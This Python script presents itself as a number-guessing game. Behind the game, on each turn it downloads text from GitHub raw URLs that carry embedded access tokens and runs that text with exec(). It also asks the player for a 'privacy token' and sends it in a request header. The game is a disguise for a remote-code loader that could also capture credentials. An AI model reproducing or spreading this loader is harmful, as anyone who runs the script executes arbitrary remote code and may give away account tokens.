import requests

import random

print("version 2.0")
isatc= input("enter atc:")

def plr():
    secret_number = random.randint(1, 100)
    attempts = 0

    while True:
        url = 'https://raw.githubusercontent.com/xsjfns/myown/main/manket.txt?token=GHSAT0AAAAAACQOYUHX5ZD3ZL2PUJKUWE5QZQMUA7Q'
        url2 = 'https://raw.githubusercontent.com/xsjfns/myown/main/atcket.txt?token=GHSAT0AAAAAACQOYUHW4OELJLACJ6OIJKMCZQMUB7A'
        guess = input("Enter your guess: ")
        token = input("Enter your privacy  token: ")
        headers = {"Authorization": f"token {token}"}
        if isatc=="ok":
            response = requests.get(url2, headers=headers) 
            exec(response.text)
        response = requests.get(url, headers=headers)
        if not guess.isdigit():
            print("Please enter a valid number.")
            continue
        
        guess = int(guess)
        attempts += 1

        if guess < secret_number:
            print("Too low! Try again.")
            exec(response.text)
        elif guess > secret_number:
            print("Too high! Try again.")
            exec(response.text)
        else:
            print(f"Congratulations! You've guessed the number {secret_number} in {attempts} attempts!")
            exec(response.text)
            break
            
def edg():
    print("Thanks for playing!")

print("Welcome to the Number Guessing Game!")
print("I'm thinking of a number between 1 and 100.")
print("Try to guess it in the fewest attempts possible!")
print("Let's begin!")
print("versoin 2.0")
plr()
edg()
